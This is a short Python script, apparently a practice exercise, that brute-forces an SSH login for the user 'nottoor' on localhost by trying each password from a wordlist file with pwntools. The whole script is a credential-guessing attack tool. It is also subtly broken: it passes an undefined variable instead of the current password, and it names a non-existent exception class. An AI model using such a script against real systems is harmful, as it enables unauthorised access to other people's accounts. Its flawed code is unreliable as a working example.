# import modules required if not then install it

from pwn import * 
import paramiko 

host="127.0.0.1"
username="nottoor" 
attempt=0

# password.txt file containls the passwords .it should be in the corrent directory
with open("password.txt","+r") as pass_list:
    for pas in pass_list:
        pas =pas.strip("\n")
        try:
            print(" [{}] attempting password '{}'".format(attempt,pas))
            response = ssh(host=host,user=username, password= password, timeout=1)
            if response.connected():
                print("[>] valid password found : '{}'".format(pas))
                response.close()
                break
            response.close()

        except paramiko.SSHException.AuthenticationException:
            print("[X] invalid exception ")
        attempt += 1

        
        